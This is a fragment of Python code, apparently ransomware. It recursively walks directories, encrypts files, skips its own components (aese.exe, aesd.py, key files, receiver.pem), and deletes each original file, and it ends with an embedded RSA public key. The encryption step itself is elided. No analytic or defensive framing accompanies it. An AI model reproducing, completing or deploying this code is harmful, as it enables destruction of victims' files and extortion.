...
def encrypt(key,path):
    ...
    #print(files)
    for fil in files:
        if os.path.isdir("{file_name}".format(file_name=fil)):
            path1="{path_name}/{file_name}".format(path_name=path, file_name=fil)
            encrypt(key,path1)
            os.chdir("{path_name}".format(path_name=path))
            continue
        filn = fil.split('.')
        if (len(fil)<=10 or fil[-10:]!='.encrypted') and fil!='aese' and fil!='aese.exe' and fil!='aesd.py' and fil!='receiver.pem' and fil!='key.key' and fil!='key1.key' and fil!='aese.py' and fil!='private_pem.encrypted':
            ...
            os.remove("{file_name}".format(file_name=fil))
...

HQIDAQAB
-----END PUBLIC KEY-----"""
